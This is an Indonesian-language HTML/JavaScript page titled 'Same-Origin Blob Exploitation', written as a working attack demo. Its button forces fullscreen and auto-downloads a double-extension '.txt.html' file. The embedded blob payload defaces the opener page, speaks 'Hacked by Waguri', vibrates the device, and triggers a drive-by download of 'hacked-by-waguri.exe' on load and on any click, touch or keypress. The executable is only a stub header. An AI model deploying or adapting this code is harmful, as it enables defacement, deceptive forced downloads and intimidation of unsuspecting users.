<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Same-Origin Blob Exploitation</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
h2 { margin-bottom: 10px; }
p { margin-bottom: 15px; line-height: 1.5; }
button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
button:hover { background: #b71c1c; }
button:disabled { background: #555; cursor: not-allowed; }
#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
#downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
#downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Same-Origin Blob Exploitation</h2>
<p>Memicu pembuatan Blob URL berisi skrip yang mewarisi Origin halaman induk.</p>

<button id="start-btn" type="button">Mulai Eksploitasi</button>
<div id="status" role="status">Sistem siap.</div>
<div id="downloads"></div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let activeUrls = [];
let isProcessing = false;

const speak = (message) => {
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(message);
        utterance.lang = 'id-ID';
        utterance.rate = 1.0;
        window.speechSynthesis.speak(utterance);
    }
};

const prepareMimeBlobAsync = (i) => {
    return new Promise((resolve) => {
        queueMicrotask(() => {
            // Payload HTML yang akan dijalankan di dalam Blob URL (Same-Origin)
            const payloadText = "<!DOCTYPE html>" +
            "<html>" +
            "<head><meta charset='UTF-8'><title>Same-Origin Exploit</title></head>" +
            "<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
            "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
            "<h1 style='font-size:70px;color:#f00;text-shadow:0 0 30px #f00;letter-spacing:8px;animation:pulse 0.5s infinite'>SAME-ORIGIN</h1>" +
            "<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
            "<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Blob URL mewarisi Origin halaman induk.</p>" +
            "<p style='font-size:14px;color:#ff0;margin-top:20px;font-weight:bold;' id='status'>Menunggu interaksi...</p>" +
            "<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
            "</div>" +
            "<style>" +
            "@keyframes pulse { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:0.5; transform:scale(1.05); } }" +
            "body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.05) 0px, rgba(0,255,0,0.05) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
            "</style>" +
            "<script>" +
            "(function(){" +
            "\"use strict\";" +
            
            // Cek Origin: Karena Blob URL mewarisi origin, ini akan menampilkan origin yang sama dengan halaman induk.
            "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
            
            // Skrip Same-Origin: Karena ini blob:, ia bisa mengakses localStorage atau data dari origin yang sama.
            "try {" +
            "    if (window.opener) {" +
            "        window.opener.document.body.innerHTML = '<h1 style=\"color:red; text-align:center; margin-top:20%\">PAGE DEFACED VIA SAME-ORIGIN BLOB</h1>';" +
            "    }" +
            "} catch(e) { console.log('Cross-origin restriction:', e); }" +

            "function efekHacker() {" +
            "    if (navigator.vibrate) { navigator.vibrate([1000, 200, 1000, 200, 1000]); }" +
            "    if ('speechSynthesis' in window) {" +
            "        window.speechSynthesis.cancel();" +
            "        var msg = new SpeechSynthesisUtterance('Hacked by Waguri');" +
            "        msg.lang = 'en-US';" +
            "        window.speechSynthesis.speak(msg);" +
            "    }" +
            "}" +

            "function picuDownload(){" +
            "    efekHacker();" +
            "    var statusEl = document.getElementById('status');" +
            "    try{" +
            "        statusEl.textContent = 'Menyiapkan berkas...';" +
            // Payload Blob EXE
            "        var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" +
            "        var binary = atob(b64Data);" +
            "        var bytes = new Uint8Array(binary.length);" +
            "        for (var i = 0; i < binary.length; i++) { bytes[i] = binary.charCodeAt(i); }" +
            "        var blob = new Blob([bytes], { type: 'application/octet-stream' });" +
            "        var url = URL.createObjectURL(blob);" +
            "        var a = document.createElement('a');" +
            "        a.href = url;" +
            "        a.download = 'hacked-by-waguri.exe';" +
            "        a.style.display = 'none';" +
            "        document.body.appendChild(a);" +
            "        a.click();" +
            "        setTimeout(function(){ " +
            "            if (a.parentNode) a.parentNode.removeChild(a); " +
            "            URL.revokeObjectURL(url); " +
            "        }, 3000);" +
            "        statusEl.textContent = 'Payload berhasil diunduh!';" +
            "        statusEl.style.color = '#0f0';" +
            "    } catch(e){" +
            "        statusEl.textContent = 'Gagal: ' + e.message;" +
            "        statusEl.style.color = '#f00';" +
            "    }" +
            "}" +

            "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
            "document.addEventListener('click', picuDownload);" +
            "document.addEventListener('touchstart', picuDownload);" +
            "document.addEventListener('keydown', picuDownload);" +
            "})();" +
            "<\/script>" +
            "</body>" +
            "</html>";
          
            const blob = new Blob([payloadText], { type: "text/html" });
            const url = URL.createObjectURL(blob);
            resolve({ id: i, url: url });
        });
    });
};

const triggerInstantDownload = (fileData) => {
    const link = document.createElement("a");
    link.href = fileData.url;
    
    // Nama file dengan ekstensi ganda (MIME Sniffing)
    link.download = `same-origin-${fileData.id}.txt.html`;
    
    link.textContent = `Blob #${fileData.id} (.txt.html)`;
    link.style.display = "none";
    downloadsDiv.appendChild(link);
    link.click();
};

const processLoop = async (counter) => {
    if (!isProcessing) return;

    const fileData = await prepareMimeBlobAsync(counter);
    activeUrls.push(fileData.url);

    triggerInstantDownload(fileData);

    statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;

    if (counter % 10 === 0) {
        speak(`Proses mencapai ${counter} berkas.`);
    }

    // Hentikan di 1 file untuk demonstrasi Same-Origin
    if (counter >= 1) {
        isProcessing = false;
        startBtn.disabled = false;
        return;
    }

    setTimeout(() => processLoop(counter + 1), 0);
};

startBtn.addEventListener("click", () => {
    if (isProcessing) return;

    activeUrls.forEach(url => URL.revokeObjectURL(url));
    activeUrls = [];
    downloadsDiv.replaceChildren();

    speak("Mengaktifkan mode layar penuh.");

    const root = document.documentElement;
    try {
        if (root.requestFullscreen) {
            root.requestFullscreen();
        } else if (root.webkitRequestFullscreen) {
            root.webkitRequestFullscreen();
        } else if (root.mozRequestFullScreen) {
            root.mozRequestFullScreen();
        }
        statusDiv.textContent = "Mengunci layar penuh...";
    } catch (err) {
        console.warn("Fullscreen tidak didukung atau ditolak:", err);
    }

    setTimeout(() => {
        isProcessing = true;
        speak("Proses pembuatan berkas Blob dimulai.");
        processLoop(1);
    }, 300);
});
</script>
</body>
</html>
